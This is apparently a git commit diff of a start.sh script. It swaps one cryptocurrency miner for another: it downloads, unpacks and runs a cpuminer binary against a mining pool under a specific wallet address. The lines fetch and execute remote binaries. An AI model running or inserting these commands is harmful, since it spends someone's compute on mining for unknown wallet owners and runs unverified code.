ed91545404db5002937552a6f086d7166621f423
doorironma <108709212+doorironma@users.noreply.github.com>
2022-07-05 10:21:01 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,4 @@
 #github.com/hellcatz/luckpool
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar -xf hellminer_cpu_linux.tar.gz
-chmod +x hellminer
-./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RQL92zvgfgee37pEbbUR6eQ7wHDg7ZZnD2.rig0 -p x --cpu 2
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qU2ej95494CVryNFy254sPRLXizvHGAurj.TES -t4
